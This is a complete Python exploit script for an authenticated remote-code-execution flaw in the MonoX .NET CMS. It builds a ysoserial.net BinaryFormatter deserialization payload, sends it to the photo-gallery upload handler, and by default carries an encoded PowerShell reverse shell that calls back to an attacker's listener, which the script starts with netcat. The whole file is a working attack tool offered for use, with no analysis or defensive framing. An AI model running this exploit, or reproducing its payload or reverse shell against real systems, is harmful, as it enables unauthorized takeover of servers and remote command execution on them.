import subprocess
import argparse
import os
import sys
import base64
import json
import requests
import time
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests_toolbelt.multipart.encoder import MultipartEncoder


class Listener:

    @staticmethod
    def setup(lport):
        print("[+] Setting up listener")
        try:
            if os.name == "nt":
                subprocess.Popen(f"start cmd /c nc.exe -L -p {lport}", shell=True)
            else:
                subprocess.Popen(f"gnome-terminal -q -- nc -lvkkp {lport}", shell=True)
        except:
            print("[-] Could not setup listener")
            return False
        finally:
            return True

class PSRevShell:

    def __init__(self, lhost, lport):
        self._lhost = lhost
        self._lport = lport

    @property
    def raw(self):
        shell = "$client=New-Object System.Net.Sockets.TCPClient('" + self._lhost + "'," + str(self._lport) + ");$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};"
        shell += "while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        shell += "$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path + '> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
        shell += "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
        return shell

    @property
    def encoded(self):
        return base64.b64encode(self.raw.encode('utf-16le')).decode('utf-8')

class Exploit:

    def __init__(self, target=None, proxy=False, user=None, password=None, command=None, lhost=None, lport=None, ysoserial=None):
        self.session = None
        self.target = target
        self.proxy(proxy)
        self.user = user
        self.password = password
        self.setup_ysoserial(ysoserial)
        self.command = command
        self.lhost = lhost
        self.lport = lport

    def setup_ysoserial(self, ysoserial_path):
        self.ysoserial = YsoserialNET(ysoserial_path)


    def login(self):
        url = f"{self.target}/lng/en-US/login.aspx"
        headers = self.getheaders("agent")
        data = {
            "__EVENTTARGET": "ctl00$ctl00$cp$cp$ctlLogin$ctlLogin$Login$btnButton", 
            "__EVENTARGUMENT": '', "__VIEWSTATE_WAOKEY": "VIEWSTATE_jdt4mi5pkrtnc32hvkupz2n4_-206710239_637229029905969795", 
            "__VIEWSTATE": '', "ctl00$ctl00$cp$cp$ctlLogin$ctlLogin$UserName": self.user, 
            "ctl00$ctl00$cp$cp$ctlLogin$ctlLogin$Password": self.password
            }
        res = requests.post(url, headers=headers, data=data, proxies=self.proxy, allow_redirects=False, verify=False)

        if res.status_code != 302:
            print("[-] Could not login")
            sys.exit(1)
        else:
            self.session = res.cookies


    def proxy(self, flag):
        self.proxy =  {"http" : "http://127.0.0.1:8080", "https" : "http://127.0.0.1:8080"} if flag else None

    def getheaders(self, type, mdata=None):
        if type == "multipart" and mdata:
            return {"Content-Type" : mdata.content_type, "User-Agent": "Mozilla/5.0 Gecko/20100101 Firefox/71.0" }
        elif "agent" or mdata is None:
            return {"User-Agent": "Mozilla/5.0 Gecko/20100101 Firefox/71.0", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8" }

    def generate_payload(self):
        command = "calc"
        try:
            command = self.command if self.command else f"powershell -nop -exec bypass -enc {PSRevShell(self.lhost, self.lport).encoded}"
        except Exception as e:
            print("[-] Something went wrong")
            print(f"[-] {e}")

        formatter = "BinaryFormatter"
        gadget = "TypeConfuseDelegate"
        self.ysoserial.set_args(formatter=formatter, gadget=gadget, command=command)
        payload = self.ysoserial.execute()
        payload = self.urlencode(payload)
        return payload

    def urlencode(self, payload):
        payload = payload.decode()
        payload = payload.replace("\r", "").replace("\n", "")
        payload = payload.replace("/", "%2f")
        payload = payload.replace("+", "%2b")
        payload = payload.replace("=", "%3d")
        return payload

    def run(self):
        print("[*] Logging in")
        self.login()
        time.sleep(1)
        print("[*] Triggering RCE")
        payload = self.generate_payload()
        url = f"{self.target}/MonoX/Pages/SocialNetworking/lng/en-US/PhotoGallery.aspx"
        
        rawdata =  f"ctl00%24ctl00%24ctl01%24ctl00%24cp%24cp%24wpm%24gwpsnPhotoGallery"
        rawdata += f"%24snPhotoGallery%24photoUpload%24ctlUpload%24handlerResponse={payload}"
        rawdata += f"(SEPARATOR)&ctl00_ctl00_ctl01_ctl00_cp_cp_wpm_gwpsnPhotoGallery_sn"
        rawdata += f"PhotoGallery_photoUpload_ctlUpload_fileGallery_wndManager_ClientState="
        rawdata += f"&ctl00_ctl00_ctl01_ctl00_editorSourceWindowManager_ClientState=&__VIEWS"
        rawdata += f"TATE_WAOKEY=&__VIEWSTATE=&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=0&__ASY"
        rawdata += f"NCPOST=true&ctl00%24ctl00%24ctl01%24ctl00%24cp%24cp%24wpm%24gwpsnPhotoG"
        rawdata += f"allery%24snPhotoGallery%24photoUpload%24ctlUpload%24btnPostback="

        headers = self.getheaders('agent')

        res = requests.post(url, headers=headers, cookies=self.session, data=rawdata, proxies=self.proxy, allow_redirects=False, verify=False)

        msg = "[-] Exploit failed"
        try:
            if re.search(r"^([\w|\#]{0,15}\|)+ctl00_ctl00_ctl01_ctl00_cp_ajaxPanelMain", res.text[0:80]):
                msg = "[+] Success!"
        except Exception as e:
            print(f"[-] {e}")
        print(msg)



class YsoserialNET:

    def __init__(self, exe_file):
        self.exe_file = None
        if self.check_exec(exe_file):
            self.exe_file = exe_file
        else:
            print("[-] exe_file not valid")
            sys.exit(1)

    def check_exec(self, path):
        if not os.path.isfile(path):
            return False
        res = False
        try:
            res = subprocess.check_output([f'{path}','']).decode().startswith("Missing arguments") 
        except Exception as e:
            print(f"[-] Error: {self.exe_file}{e}")
        finally:
            return res
        
    def set_args(self, formatter=None, gadget=None, command=None, output=None):
        self.command = command
        self.formatter = formatter
        self.gadget = gadget
        self.output = "base64"
    
    def execute(self):
        return subprocess.check_output(f'{self.exe_file} -g {self.gadget} -f {self.formatter} -o {self.output} -c "{self.command}"')
        

def main():
    parser = argparse.ArgumentParser(description='RCE Exploit MonoX')
    
    parser.add_argument(
        '-u', '--user', required=True, type=str, help='Username')
    parser.add_argument(
        '-p', '--password', required=True, type=str, help='Password')
    parser.add_argument(
        '-c', '--command', required=False, type=str, help='Command to execute')
    parser.add_argument(
        '-H', '--lhost', required=False, type=str, default=None, help='Local Listener IP Address')
    parser.add_argument(
        '-P', '--lport', required=False, type=str, default=None, help='Local Listener Port')
    parser.add_argument(
        '-x', '--proxy', required=False, action="store_true", help='Proxy (for debugging)')
    parser.add_argument(
        '-d', '--debug', required=False, action="store_true", help='Enable debug output')
    parser.add_argument(
        '-y', '--ysoserial', required=False, type=str, default="C:\\Users\\d3adc0de\\Desktop\\bin\\ysoserial.net\\ysoserial.exe", help='Path to Ysoserial.NET')    
    parser.add_argument(
        '-t', '--target', required=True, type=str, default=None, help='Target Base URL')

    args = parser.parse_args()

    if args.command and ( args.lhost or args.lport):
        print("[-] Options -c is incompatible with -L and -H")
        sys.exit(1)
    if args.command:
        exploit = Exploit(target=args.target, proxy=args.proxy, user=args.user, password=args.password, command=args.command, lhost=None, lport=None, ysoserial=args.ysoserial)
    else:
        exploit = Exploit(target=args.target, proxy=args.proxy, user=args.user, password=args.password, command=None, lhost=args.lhost, lport=args.lport, ysoserial=args.ysoserial)

    exploit.run()

if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    main()